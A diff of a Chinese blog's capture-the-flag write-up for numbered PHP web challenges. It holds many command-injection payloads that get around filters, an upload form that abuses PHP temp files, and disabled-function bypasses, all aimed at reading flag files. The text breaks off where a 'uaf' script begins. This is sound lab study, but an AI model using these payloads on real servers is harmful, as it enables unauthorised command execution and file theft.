-<h5 id="46"><a href="#46" class="headerlink" title="46"></a>46</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%09fla?.php%26%26</span><br></pre></td></tr></table></figure>
+<h5 id="46"><a href="#46" class="headerlink" title="46"></a>46</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%09fla?.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同上题，过滤了*和$，使用%09（制表符）替代空格</p>
-<h5 id="47"><a href="#47" class="headerlink" title="47"></a>47</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%09fla?.php%26%26</span><br></pre></td></tr></table></figure>
+<h5 id="47"><a href="#47" class="headerlink" title="47"></a>47</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac%09fla?.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同上题，过滤了一些读取文件的命令，但没滤tac，直接用</p>
-<h5 id="48"><a href="#48" class="headerlink" title="48"></a>48</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac&lt;fl%27%27ag.php%26%26</span><br></pre></td></tr></table></figure>
+<h5 id="48"><a href="#48" class="headerlink" title="48"></a>48</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php%26%26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同上题，过滤了数字和空格</p>
-<h5 id="49"><a href="#49" class="headerlink" title="49"></a>49</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac&lt;fl%27%27ag.php||</span><br></pre></td></tr></table></figure>
+<h5 id="49"><a href="#49" class="headerlink" title="49"></a>49</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>同上题，过滤了水平制表符和&amp;&amp;符，将&amp;更换为｜也可以多命令执行</p>
-<h5 id="50"><a href="#50" class="headerlink" title="50"></a>50</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac&lt;fl%27%27ag.php||</span><br></pre></td></tr></table></figure>
+<h5 id="50"><a href="#50" class="headerlink" title="50"></a>50</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;tac&lt;fl%27%27ag.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h5 id="51"><a href="#51" class="headerlink" title="51"></a>51</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=nl&lt;fla%27%27g.php||</span><br></pre></td></tr></table></figure>
+<h5 id="51"><a href="#51" class="headerlink" title="51"></a>51</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;nl&lt;fla%27%27g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>滤了tac呜呜呜呜用nl</p>
-<h5 id="52"><a href="#52" class="headerlink" title="52"></a>52</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=nl$&#123;IFS&#125;/fl%27%27ag||</span><br></pre></td></tr></table></figure>
+<h5 id="52"><a href="#52" class="headerlink" title="52"></a>52</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;nl$&#123;IFS&#125;&#x2F;fl%27%27ag||<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>滤掉了尖括号但是$回来了</p>
 <p><code>nl$&#123;IFS&#125;fla%27%27g.php||</code></p>
 <p>但是明显flag不对，所以看一下根目录<code>ls$&#123;IFS&#125;/</code>发现flag存在</p>
 <p>使用nl读取</p>
-<h5 id="53"><a href="#53" class="headerlink" title="53"></a>53</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=ta%27%27c$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure>
+<h5 id="53"><a href="#53" class="headerlink" title="53"></a>53</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;ta%27%27c$&#123;IFS&#125;fla?.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>该题内容不同</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo($c);</span><br><span class="line">$d = system($c);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;.$d;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">echo($c);
+$d &#x3D; system($c);
+echo &quot;&lt;br&gt;&quot;.$d;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>先将命令打印并执行后获得system函数的返回值并输出，system函数只返回命令执行后输出的最后一行，使用tac</p>
-<h5 id="54"><a href="#54" class="headerlink" title="54"></a>54</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:c=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;kkk.txt</span><br><span class="line">/kkk.txt</span><br></pre></td></tr></table></figure>
+<h5 id="54"><a href="#54" class="headerlink" title="54"></a>54</h5><pre class="line-numbers language-none"><code class="language-none">payload:c&#x3D;mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;kkk.txt
+&#x2F;kkk.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>过滤了单引号绕过，通过mv命令重命名直接读取</p>
 <h5 id="55"><a href="#55" class="headerlink" title="55"></a>55</h5><p>过滤<code>&quot;/\;|[a-z]|\</code>|%|\x09|\x26|&gt;|&lt;/i”</p>
@@ -538,120 +533,437 @@
 <p>除了使用?和*进行任意匹配，还可以使用<code>[^X]</code>来排除某个字符，这样我们就可以排除前面包含<code>-</code>和<code>.</code>文件，继续查看发现还剩下三个文件，而后发现还有一个通配符语法<code>[X-Y]</code>可以表示一个范围，而且只有php临时文件中包含大写字母，查询ascii码表发现大写字母位于<code>@</code>和<code>[</code>之间，所以构造<code>[@-[]</code>就可以匹配到我们的文件了</p>
 <p>最终payload</p>
 <p>首先构建一个上传文件的html</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;当前链接/?c=./???/????????[@-[]&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>当前链接/?c=./???/????????[@-[]<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>第一个文件内容</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">然后</span><br><span class="line">cat /var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ls
+然后
+cat &#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>如果一次不成功就repeater多试几次</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/ming2.png"></p>
 <p>拿到flag</p>
-<h5 id="57"><a href="#57" class="headerlink" title="57"></a>57</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>
+<h5 id="57"><a href="#57" class="headerlink" title="57"></a>57</h5><pre class="line-numbers language-none"><code class="language-none">payload:?c&#x3D;$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>[a-z]|[0-9]|`||#|&#39;|&quot;|`|%|\x09|\x26|\x0a|&gt;|&lt;|.|,|?|*|-|=|[/i</p>
 <p>过滤了大量字符，最终需要构建36即可，没有过滤<code>$</code>，而在Linux中$是变量的关键字，所以我们可以使用变量</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$(())这个变量中的()代表数学运算，结果为0，所以</span><br><span class="line">echo $(())</span><br><span class="line">0</span><br><span class="line">对这个变量进行取反操作结果为</span><br><span class="line">echo ~$(())</span><br><span class="line">~0</span><br><span class="line">那么我们再对~0进行数学运算得到的结果就是</span><br><span class="line">echo $((~$(())))</span><br><span class="line">~1</span><br><span class="line">所以我们想得到36就是让36个~1相加再取反</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">$(())这个变量中的()代表数学运算，结果为0，所以
+echo $(())
+0
+对这个变量进行取反操作结果为
+echo ~$(())
+~0
+那么我们再对~0进行数学运算得到的结果就是
+echo $((~$(())))
+~1
+所以我们想得到36就是让36个~1相加再取反
+echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h5 id="58"><a href="#58" class="headerlink" title="58"></a>58</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=file_get_contents(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure>
+<h5 id="58"><a href="#58" class="headerlink" title="58"></a>58</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;file_get_contents(&#39;flag.php&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>命令执行，突破禁用函数</p>
 <p>首先尝试system发现被过滤了，emmmm尝试过后发现能执行系统命令的全被禁用了</p>
 <p>那么尝试能否读取文件，使用file_get_contents读取成功，提示中也显示show_source同样可用</p>
-<h5 id="59"><a href="#59" class="headerlink" title="59"></a>59</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=show_source(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure>
+<h5 id="59"><a href="#59" class="headerlink" title="59"></a>59</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;show_source(&#39;flag.php&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>能执行系统命令的就别试了，全挂了</p>
 <p>show_source可用</p>
 <p>还可尝试通过include来包含文件，再通过PHP伪协议进行读取</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">POST</span><br><span class="line">c=include($_GET[&#x27;flie&#x27;]);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php
+POST
+c&#x3D;include($_GET[&#39;flie&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h5 id="60"><a href="#60" class="headerlink" title="60"></a>60</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=highlight_file(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+<h5 id="60"><a href="#60" class="headerlink" title="60"></a>60</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;highlight_file(&#39;flag.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>上一题可用的方法也可</p>
 <h5 id="61"><a href="#61" class="headerlink" title="61"></a>61</h5><p>同上</p>
-<h5 id="62"><a href="#62" class="headerlink" title="62"></a>62</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=include(&#x27;flag.php&#x27;);echo $flag;</span><br></pre></td></tr></table></figure>
+<h5 id="62"><a href="#62" class="headerlink" title="62"></a>62</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;include(&#39;flag.php&#39;);echo $flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>上面所有方法皆可</p>
-<h5 id="63"><a href="#63" class="headerlink" title="63"></a>63</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=include(&#x27;flag.php&#x27;);var_dump(get_defined_vars());</span><br></pre></td></tr></table></figure>
+<h5 id="63"><a href="#63" class="headerlink" title="63"></a>63</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;include(&#39;flag.php&#39;);var_dump(get_defined_vars());<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><code>get_defined_vars()</code>可获得所有已定义的变量，当不知道变量名时可使用这个</p>
 <p>上面方法同样🉑️</p>
-<h5 id="64"><a href="#64" class="headerlink" title="64"></a>64</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=include(&#x27;flag.php&#x27;);echo $flag;</span><br></pre></td></tr></table></figure>
+<h5 id="64"><a href="#64" class="headerlink" title="64"></a>64</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;include(&#39;flag.php&#39;);echo $flag;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p><code>scandir(&#39;.&#39;)</code>可用于扫描文件，和ls一个意思，当我们不知道文件名时可使用</p>
 <h5 id="65"><a href="#65" class="headerlink" title="65"></a>65</h5><p>同上</p>
 <h5 id="66"><a href="#66" class="headerlink" title="66"></a>66</h5><p>![](<a target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-19">https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19</a> 17.49.25.png)</p>
 <p>尝试失败还被嘲讽了，首先扫描一下文件，发现根目录下有flag.txt，<code>highlight_file(&#39;/flag.txt&#39;)</code>读取即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;highlight_file(&#39;&#x2F;flag.txt&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <h5 id="67"><a href="#67" class="headerlink" title="67"></a>67</h5><p>同上</p>
-<h5 id="68"><a href="#68" class="headerlink" title="68"></a>68</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;)</span><br></pre></td></tr></table></figure>
+<h5 id="68"><a href="#68" class="headerlink" title="68"></a>68</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;include(&#39;&#x2F;flag.txt&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>属于是离谱了，直接封了<code>highlight_file</code>函数，<code>var_dump(scandir(&#39;/&#39;))</code>，发现在根目录中，直接include文件，没有php标签即为直接显示源码，等于直接显示flag.txt的内容</p>
 <h5 id="69"><a href="#69" class="headerlink" title="69"></a>69</h5><p>同上</p>
 <h5 id="70"><a href="#70" class="headerlink" title="70"></a>70</h5><p>继续白嫖</p>
-<h5 id="71"><a href="#71" class="headerlink" title="71"></a>71</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+<h5 id="71"><a href="#71" class="headerlink" title="71"></a>71</h5><pre class="line-numbers language-none"><code class="language-none">payload:
+POST
+c&#x3D;include(&#39;&#x2F;flag.txt&#39;);exit();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>尝试白嫖发现失败，下载源码进行查看，发现在输出之前将缓冲区中的所有数字字母换成了问号，那么我们让它包含完直接退出就行了</p>
 <h5 id="72"><a href="#72" class="headerlink" title="72"></a>72</h5><p>文件换位置了哭哭，scandir找不到根目录，var_dump也没了，哭哭</p>
 <p>看提示</p>
 <p>首先找出文件名</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">POST</span><br><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">payload:
+POST
+c&#x3D;$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);
+foreach($a as $f)
+&#123;echo($f-&gt;__toString().&#39; &#39;);
+&#125; exit(0);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>![](<a target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-03-19">https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-03-19</a> 23.52.16.png)uaf脚本如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 